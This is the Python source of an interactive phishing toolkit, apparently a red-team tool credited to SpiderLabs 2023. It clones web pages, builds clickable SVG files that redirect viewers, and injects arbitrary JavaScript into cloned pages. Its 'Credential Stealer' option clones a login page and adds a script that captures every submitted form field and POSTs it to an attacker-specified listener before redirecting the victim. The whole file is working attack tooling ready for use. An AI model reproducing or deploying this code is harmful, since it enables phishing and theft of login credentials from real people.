import base64
import os
from bs4 import BeautifulSoup
import httpx

red_start = "\033[91m"
red_end = "\033[0m"
green_start="\033[38;2;0;255;0m"
green_end="\033[0m"

swag = f'''{red_start}

 ▄▄▄██▀▀▀▒█████   ██▀███   ▒█████    ▄████  █    ██  ███▄ ▄███▓ ▒█████  
   ▒██  ▒██▒  ██▒▓██ ▒ ██▒▒██▒  ██▒ ██▒ ▀█▒ ██  ▓██▒▓██▒▀█▀ ██▒▒██▒  ██▒
   ░██  ▒██░  ██▒▓██ ░▄█ ▒▒██░  ██▒▒██░▄▄▄░▓██  ▒██░▓██  : ▓██░▒██░  ██▒
▓██▄██▓ ▒██   ██░▒██▀▀█▄  ▒██   ██░░▓█  ██▓▓▓█  ░██░▒██  : ▒██ ▒██   ██░
 ▓███▒  ░ ████▓▒░░██▓ ▒██▒░ ████▓▒░░▒▓███▀▒▒▒█████▓ ▒██▒ : ░██▒░ ████▓▒░
 ▒▓▒▒░  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░▒   ▒ ░▒▓▒ ▒ ▒ ░ ▒░ : ░  ░░ ▒░▒░▒░ 
 ▒ ░▒░    ░ ▒ ▒░   ░▒ ░ ▒░  ░ ▒ ▒░   ░   ░ ░░▒░ ░ ░ ░  ░ :    ░  ░ ▒ ▒░ 
 ░ ░ ░  ░ ░ ░ ▒    ░░   ░ ░ ░ ░ ▒  ░ ░   ░  ░░░░  ░  ░   : ░   ░ ░ ░ ▒
 ░        ░         ░                         ░ ░   ░/\('')/\  ░     ░     
                                              +------\      /------+ ░
                                              |   SpiderLabs 2023  |░
                                              +--------------------+ ░
                                              ░     ░      ░       ░   
{red_end}'''
print(swag)

def get_base64_image_data(image_url):
    with httpx.stream("GET", image_url) as response:
        image_content = response.read()
    encoded_image = base64.b64encode(image_content)
    return f'data:image/png;base64,{encoded_image.decode("utf-8")}'

def menu():
    print("Select an option:")
    print("1. Clone a webpage")
    print("2. Create a standalone SVG payload")
    print("3. Stored Cross-Site Scripting SVG Credential Stealer")
    print("4. Build a webpage with existing JavaScript and HTML")
    print("5. Build a webpage with existing JavaScript but no HTML")
    print("6. Custom JavaScript Stored Cross-Site Scripting SVG Payload")
    print("7. Exit")
    return input(f'{red_start}Enter the number of your choice:{red_end} ')

while True:
    option = menu()

    if option == '1':
        clone_url = input(f'{red_start}Enter the URL of the webpage you want cloned:{red_end} ')

        response = httpx.get(clone_url)
        html_content = response.content

        clone = BeautifulSoup(html_content, 'html.parser')

        with open('webpage.html', 'w', encoding='utf-8') as f:
            f.write(clone.prettify())

        print(f'{green_start}[+] Generated webpage.html{green_end}')

    elif option == '2':
        image_url_input = input(f'{red_start}Enter a direct image URL or press Enter to use the default image:{red_end} ')
        if not image_url_input:
            image_url_input = 'https://support.rocketspark.com/hc/article_attachments/900002328266/Screenshot_2020-07-10_15.37.48.png'
        redirect_url = input(f'{red_start}Enter the redirect URL:{red_end} ')

        base64_image_data = get_base64_image_data(image_url_input)

        svg_template = f"""
        <svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                <a xlink:href="{redirect_url}">
                    <rect x="0" y="0" width="100%" height="100%" fill-opacity="0" />
                    <image width="130" height="25" x="-100" y="5" xlink:href="{base64_image_data}" />
                </a>
            </g>
        </svg>
        """

        with open('payload.svg', 'w', encoding='utf-8') as f:
            f.write(svg_template)

        print(f'{green_start}[+] Generated payload.svg{green_end}')

    elif option == '3':

        clone_url = input(f'{red_start}Enter the URL of the login page you want cloned:{red_end} ')
        redirect_url = input(f'{red_start}Enter the URL where you will host the fake login page:{red_end} ')

        response = httpx.get(clone_url)
        html_content = response.content

        clone = BeautifulSoup(html_content, 'html.parser')

        listener_input = input(f'{red_start}Enter the raw IP address of a listener, or a URL to a request catcher (e.g., https://testcatchum.requestcatcher.com/test):{red_end} ')
        if listener_input.startswith('http'):
            listener = listener_input
        else:
            port = input(f'{red_start}Enter the port for the listener:{red_end} ')
            listener = f'http://{listener_input}:{port}'

        script = f"""
        <script>
            document.addEventListener('submit', function(event) {{
                event.preventDefault();

                var formElements = event.target.elements;
                var formData = new FormData();

                for (var i = 0; i < formElements.length; i++) {{
                    var element = formElements[i];
                    if (element.name) {{
                        formData.append(element.name, element.value);
                    }}
                }}

                fetch('{listener}', {{
                    method: 'POST',
                    body: formData
                }}).then(function() {{
                    window.location = '{redirect_url}';
                }});

                return false;
            }});
        </script>
        """

        clone.body.append(BeautifulSoup(script, 'html.parser'))

        with open('page-clone.html', 'w', encoding='utf-8') as f:
            f.write(clone.prettify())

        print(f'{green_start}page-clone.html was generated.{green_end}')

    elif option == '4':
         
         html_file = input(f'{red_start}Enter the name of the .html file you want to add JS to:{red_end} ')

         with open(html_file, 'r', encoding='utf-8') as f:
             html_content = f.read()
         clone = BeautifulSoup(html_content, 'html.parser')

         js_file_or_url = input(f'{red_start}Enter the name of your JS file or the full URL to the .js file:{red_end} ')
         if os.path.isfile(js_file_or_url):
             with open(js_file_or_url, 'r') as js_file:
                 script = f'<script>{js_file.read()}</script>'
         else:
             script = f'<script src="{js_file_or_url}"></script>'
         clone.body.append(BeautifulSoup(script, 'html.parser'))

         with open(html_file, 'w', encoding='utf-8') as f:
             f.write(clone.prettify())

         print(f'{green_start}[+] Your JavaScript has been added into {html_file}{green_end}')

    elif option == '5':
        clone_url = input(f'{red_start}Enter the URL of the page you want cloned:{red_end} ')

        response = httpx.get(clone_url)
        html_content = response.content.decode(response.encoding)

        clone = BeautifulSoup(html_content, 'html.parser')

        js_file_or_url = input(f'{red_start}Enter the name of your JS file or the full URL to the .js file:{red_end} ')
        if os.path.isfile(js_file_or_url):
            with open(js_file_or_url, 'r') as js_file:
                script = f'<script>{js_file.read()}</script>'
        else:
            script = f'<script src="{js_file_or_url}"></script>'
        clone.body.append(BeautifulSoup(script, 'html.parser'))

        with open('payload.html', 'w', encoding='utf-8') as f:
            f.write(clone.prettify())

        print(f'{green_start}[+] Generated payload.html{green_end}')

    elif option == '6':

        clone_url = input(f'{red_start}Enter the URL of the page you want cloned:{red_end} ')

        response = httpx.get(clone_url)
        html_content = response.content.decode(response.encoding)

        clone = BeautifulSoup(html_content, 'html.parser')

        js_file_or_url = input(f'{red_start}Enter the name of your JS file or the full URL to the .js file:{red_end} ')
        if os.path.isfile(js_file_or_url):
            with open(js_file_or_url, 'r') as js_file:
                script = f'<script>{js_file.read()}</script>'
        else:
            script = f'<script src="{js_file_or_url}"></script>'
        clone.body.append(BeautifulSoup(script, 'html.parser'))

        with open('page-clone.html', 'w', encoding='utf-8') as f:
            f.write(clone.prettify())

        print(f'{red_start}page-clone.html was generated.{red_end}')

        image_url_input = input(f'{red_start}Enter a direct image URL or press Enter to use the default image: ')
        if not image_url_input:
            image_url_input = 'https://support.rocketspark.com/hc/article_attachments/900002328266/Screenshot_2020-07-10_15.37.48.png'

        base64_image_data = get_base64_image_data(image_url_input)

        redirect_url = input(f'{red_start}Enter the URL where you will host the fake login page:{red_end} ')

        svg_template = f"""
        <svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                <a xlink:href="{redirect_url}">
                    <rect x="0" y="0" width="100%" height="100%" fill-opacity="0" />
                    <image width="130" height="25" x="-100" y="5" xlink:href="{base64_image_data}" />
                </a>
            </g>
        </svg>
        """

        with open('payload.svg', 'w', encoding='utf-8') as f:
            f.write(svg_template)

        print(f'{green_start}[+] Generated payload.svg{green_end}')

    elif option == '7':
        print(f'{red_start}Exiting the script...{red_end}')
        exit()
